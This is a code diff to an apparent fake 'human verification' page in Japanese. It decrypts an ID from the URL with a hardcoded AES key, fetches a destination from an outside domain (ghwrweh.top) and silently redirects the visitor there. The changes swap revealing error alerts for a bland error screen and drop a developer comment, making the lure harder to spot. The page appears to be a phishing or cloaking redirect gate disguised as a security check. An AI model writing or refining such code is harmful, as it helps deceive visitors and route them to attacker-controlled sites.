@@ -62,10 +62,22 @@
       background-color: #ccc;
       cursor: not-allowed;
     }
+    .error-page {
+      text-align: center;
+      color: #222;
+    }
+    .error-page h2 {
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+    .error-page p {
+      font-size: 14px;
+      color: #666;
+    }
   </style>
 </head>
 <body>
-  <div class="box">
+  <div class="box" id="main-box">
     <p>あなたが人間であることを知らせてください</p>
     <label><input type="checkbox" id="chk">人間であることを確認します</label>
     <button id="confirmBtn" disabled>確認する</button>
@@ -73,13 +85,20 @@
     <div class="caption">セキュリティ認証サービス</div>
   </div>
 
+  <div id="error-box" class="error-page" style="display: none;">
+    <h2>ページの確認中に問題が発生しました。</h2>
+    <p>しばらくしてからもう一度お試しください。</p>
+    <hr>
+  </div>
+
   <script>
     const AES_KEY = "5Ctianyoumabiiii";
     const checkbox = document.getElementById("chk");
     const button = document.getElementById("confirmBtn");
     const spinner = document.getElementById("spinner");
+    const errorBox = document.getElementById("error-box");
+    const mainBox = document.getElementById("main-box");
 
-    // 获取加密 ID
     const path = location.pathname.split("/").filter(Boolean);
     const encryptedId = path[path.length - 1];
 
@@ -93,9 +112,7 @@
 
       const id = await decryptAES(encryptedId);
       if (!id) {
-        alert("IDの復号に失敗しました");
-        button.style.display = "block";
-        spinner.style.display = "none";
+        showErrorPage();
         return;
       }
 
@@ -103,17 +120,20 @@
         const res = await fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(id));
         const data = await res.json();
         const url = data?.data?.siteUrl;
-        if (!url) throw new Error("URLなし");
+        if (!url) throw new Error("No URL");
 
         setTimeout(() => {
           location.href = url;
         }, 2000);
       } catch {
-        alert("リダイレクト先の取得に失敗しました");
-        button.style.display = "block";
-        spinner.style.display = "none";
+        showErrorPage();
       }
     });
+
+    function showErrorPage() {
+      mainBox.style.display = "none";
+      errorBox.style.display = "block";
+    }
 
     async function decryptAES(encText) {
       try {
